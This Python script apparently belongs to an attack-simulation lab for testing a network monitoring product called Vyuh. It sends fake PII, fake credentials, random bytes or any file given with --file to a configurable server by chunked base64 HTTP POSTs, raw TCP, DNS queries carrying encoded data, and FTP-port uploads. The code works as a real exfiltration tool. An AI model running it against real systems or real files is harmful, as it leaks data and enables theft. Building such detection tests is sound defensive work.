"""
05_data_exfiltration.py — Data Exfiltration Attack Simulation
=============================================================
Simulates data leaving the network via multiple channels:
  - HTTP POST (large body upload)
  - TCP socket (raw data transfer)
  - DNS (chunked encoding — see also dns_tunneling.py)
  - ICMP-like (custom protocol over UDP)
  - FTP-style (simulated file upload)

Vyuh should detect:
  - Large outbound data transfers
  - Data leaving on unusual ports
  - High-entropy / encoded outbound payloads
  - Spike in upload volume from a single host

Usage:
    python 05_data_exfiltration.py
    python 05_data_exfiltration.py --method http --size 102400
    python 05_data_exfiltration.py --file myfile.txt --method tcp
"""

import socket
import os
import time
import argparse
import logging
import random
import base64
import json
import string
import struct
from datetime import datetime
import urllib.request
import urllib.error
import sys

sys.path.insert(0, os.path.dirname(__file__))
import config

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(config.LOG_FILE, mode="a"),
    ]
)
log = logging.getLogger("data_exfil")

BANNER = """
╔══════════════════════════════════════════════════╗
║    Vyuh Attack Sim — 05 DATA EXFILTRATION        ║
╚══════════════════════════════════════════════════╝
"""


# ── Payload generators ────────────────────────────────────────────────────────
def generate_fake_pii(size_bytes: int) -> bytes:
    """Generate realistic-looking fake PII data (CSV format)."""
    first_names = ["Alice", "Bob", "Charlie", "David", "Emma", "Frank"]
    last_names  = ["Smith", "Jones", "Brown", "Taylor", "Wilson", "Davis"]
    rows        = ["name,email,ssn,credit_card,dob,balance\n"]

    while len("".join(rows).encode()) < size_bytes:
        fn  = random.choice(first_names)
        ln  = random.choice(last_names)
        em  = f"{fn.lower()}.{ln.lower()}@example.com"
        ssn = f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
        cc  = f"4{''.join([str(random.randint(0,9)) for _ in range(15)])}"
        dob = f"{random.randint(1960,2000)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
        bal = f"{random.uniform(100, 50000):.2f}"
        rows.append(f"{fn} {ln},{em},{ssn},{cc},{dob},{bal}\n")

    return "".join(rows).encode()[:size_bytes]


def generate_fake_credentials(count: int = 200) -> bytes:
    """Generate fake credential pairs (username:password format)."""
    usernames = ["admin", "root", "user", "svc_account", "dbadmin", "sa", "webadmin"]
    passwords = ["Password1!", "Summer2024!", "Admin@123", "Qwerty123", "letmein"]
    rows = []
    for _ in range(count):
        u = random.choice(usernames) + str(random.randint(1, 999))
        p = random.choice(passwords)
        rows.append(f"{u}:{p}")
    return "\n".join(rows).encode()


def generate_random_bytes(size: int) -> bytes:
    """Generate high-entropy random bytes (simulates encrypted exfil)."""
    return os.urandom(size)


# ── Progress bar ──────────────────────────────────────────────────────────────
def progress_bar(sent: int, total: int, width: int = 40):
    pct   = sent / total if total > 0 else 0
    filled = int(width * pct)
    bar   = "█" * filled + "░" * (width - filled)
    speed_kb = (sent / 1024)
    print(f"\r  [{bar}] {pct*100:.1f}%  {speed_kb:.1f}KB/{total/1024:.1f}KB",
          end="", flush=True)


# ── HTTP Exfiltration ─────────────────────────────────────────────────────────
def exfil_http(server: str, port: int, payload: bytes,
                chunk_size: int = 8192) -> tuple[int, str]:
    """
    Exfiltrate data via HTTP POST in chunks.
    Simulates malware uploading stolen data to attacker's web server.
    """
    log.info(f"[HTTP] Exfiltrating {len(payload)} bytes to {server}:{port}")
    total = len(payload)
    sent  = 0
    error = None

    # Encode payload as base64 (mimics real exfil tools)
    encoded = base64.b64encode(payload)

    # Split into chunks and POST each
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i + chunk_size]
        url   = f"http://{server}:{port}/upload"

        try:
            req = urllib.request.Request(
                url, data=chunk,
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Exfil-Seq":  str(i // chunk_size),
                    "X-Exfil-Total": str(len(encoded)),
                    "User-Agent":   "Mozilla/5.0",
                }
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception as e:
            # Connection refused = expected, still generates traffic
            if "Connection refused" not in str(e):
                error = str(e)

        sent += min(chunk_size, len(encoded) - i)
        # Scale sent back to original size for display
        real_sent = int((sent / len(encoded)) * total)
        progress_bar(real_sent, total)
        time.sleep(0.05)

    print()
    return total, error or "OK"


# ── TCP Raw Socket Exfiltration ───────────────────────────────────────────────
def exfil_tcp(server: str, port: int, payload: bytes,
               chunk_size: int = 4096) -> tuple[int, str]:
    """
    Exfiltrate data over a raw TCP connection.
    Uses a simple framing protocol: header(8B) + data.
    """
    log.info(f"[TCP] Exfiltrating {len(payload)} bytes to {server}:{port}")
    total = len(payload)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            try:
                s.connect((server, port))
            except ConnectionRefusedError:
                log.warning("TCP: connection refused — generating traffic anyway")
                # Simulate without actual connection for lab purposes
                for i in range(0, total, chunk_size):
                    progress_bar(min(i + chunk_size, total), total)
                    time.sleep(0.02)
                print()
                return total, "conn_refused (traffic simulated)"

            # Send length header first
            s.sendall(struct.pack(">Q", total))

            # Stream data
            sent = 0
            for i in range(0, total, chunk_size):
                chunk = payload[i:i + chunk_size]
                s.sendall(chunk)
                sent += len(chunk)
                progress_bar(sent, total)
                time.sleep(0.02)
            print()
            return sent, "OK"

    except Exception as e:
        print()
        return 0, str(e)


# ── DNS Exfiltration (lightweight) ───────────────────────────────────────────
def exfil_dns(dns_server: str, dns_port: int, payload: bytes,
               domain: str, chunk_size: int = 20) -> tuple[int, str]:
    """
    Exfiltrate via DNS queries (lightweight version).
    Full implementation in 03_dns_tunneling.py.
    """
    log.info(f"[DNS] Exfiltrating {len(payload)} bytes via DNS")
    total   = len(payload)
    encoded = base64.b32encode(payload).decode().lower().rstrip("=")
    chunks  = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    sent    = 0

    for idx, chunk in enumerate(chunks):
        fqdn = f"{idx:04x}.{chunk}.{domain}"
        try:
            import struct as _s
            tid = random.randint(0, 65535)
            pkt = _s.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            for part in fqdn.split("."):
                enc = part.encode("ascii")
                pkt += bytes([len(enc)]) + enc
            pkt += b"\x00" + _s.pack(">HH", 16, 1)

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(2)
                s.sendto(pkt, (dns_server, dns_port))
                try:
                    s.recv(512)
                except socket.timeout:
                    pass
        except Exception:
            pass

        sent += chunk_size
        real_sent = min(int((sent / len(encoded)) * total), total)
        progress_bar(real_sent, total)
        time.sleep(0.1)

    print()
    return total, "OK"


# ── FTP-style Exfiltration ───────────────────────────────────────────────────
def exfil_ftp_sim(server: str, port: int, payload: bytes) -> tuple[int, str]:
    """
    Simulate FTP-style data upload over TCP.
    Generates large outbound TCP data on port 21 (or custom).
    """
    log.info(f"[FTP] Simulated upload of {len(payload)} bytes to {server}:{port}")
    # Just reuse TCP but to the FTP port
    return exfil_tcp(server, port, payload, chunk_size=8192)


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Data Exfiltration Simulation — Vyuh")
    parser.add_argument("--server",  default=config.EXFIL_SERVER,          help="Exfil destination IP")
    parser.add_argument("--port",    default=config.EXFIL_HTTP_PORT, type=int, help="Destination port")
    parser.add_argument("--method",  default="http",
                        choices=["http", "tcp", "dns", "ftp", "all"],       help="Exfil method")
    parser.add_argument("--size",    default=config.EXFIL_FILE_SIZE, type=int, help="Payload size (bytes)")
    parser.add_argument("--file",    default=None,                          help="File to exfiltrate")
    parser.add_argument("--type",    default="pii",
                        choices=["pii", "creds", "random"],                 help="Payload type")
    parser.add_argument("--dns",     default=config.DNS_SERVER,             help="DNS server (for dns method)")
    parser.add_argument("--domain",  default=config.DNS_DOMAIN,            help="DNS base domain")
    args = parser.parse_args()

    log.info(f"=== Data Exfiltration simulation started ===")

    # Build payload
    if args.file and os.path.isfile(args.file):
        with open(args.file, "rb") as f:
            payload = f.read()
        log.info(f"Loaded file: {args.file}")
    elif args.type == "pii":
        payload = generate_fake_pii(args.size)
    elif args.type == "creds":
        payload = generate_fake_credentials()
    else:
        payload = generate_random_bytes(args.size)

    print(f"  Destination : {args.server}:{args.port}")
    print(f"  Method      : {args.method.upper()}")
    print(f"  Payload     : {len(payload):,} bytes ({args.type})")
    print()

    methods = [args.method] if args.method != "all" else ["http", "tcp", "dns"]

    results = {}
    for method in methods:
        print(f"  ── [{method.upper()} EXFIL] ──────────────────")
        start = time.time()

        if method == "http":
            sent, status = exfil_http(args.server, args.port, payload)
        elif method == "tcp":
            sent, status = exfil_tcp(args.server, config.EXFIL_PORT, payload)
        elif method == "dns":
            sent, status = exfil_dns(args.dns, config.DNS_PORT, payload[:1024],
                                      args.domain)  # DNS: cap at 1KB
        elif method == "ftp":
            sent, status = exfil_ftp_sim(args.server, 21, payload)
        else:
            sent, status = 0, "unknown method"

        elapsed = time.time() - start
        throughput = (sent / elapsed / 1024) if elapsed > 0 else 0
        results[method] = {"sent": sent, "status": status,
                           "elapsed": elapsed, "throughput_kbps": throughput}
        log.info(f"{method.upper()} exfil: {sent}B in {elapsed:.2f}s — {status}")

    # Summary
    print("\n" + "═" * 60)
    print("  DATA EXFILTRATION SUMMARY")
    print("═" * 60)
    print(f"  {'METHOD':<8} {'SENT':<14} {'TIME':<10} {'THROUGHPUT':<14} STATUS")
    print(f"  {'-'*8} {'-'*14} {'-'*10} {'-'*14} {'-'*10}")
    for m, r in results.items():
        print(f"  {m.upper():<8} {r['sent']:>10,}B   {r['elapsed']:<10.2f} "
              f"{r['throughput_kbps']:<10.1f}KB/s {r['status']}")
    print("═" * 60)


if __name__ == "__main__":
    main()
